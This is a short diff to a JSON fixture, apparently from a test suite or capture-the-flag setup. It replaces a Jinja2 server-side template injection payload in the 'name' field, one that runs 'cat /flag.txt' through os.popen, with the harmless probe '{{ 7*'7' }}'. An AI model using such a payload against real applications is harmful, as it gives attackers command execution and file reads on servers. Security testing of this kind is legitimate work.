@@ -1,4 +1,4 @@
 {
-  "name": "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}",
+  "name": "{{ 7*'7' }}",
   "data": [1, 2, 3]
 }
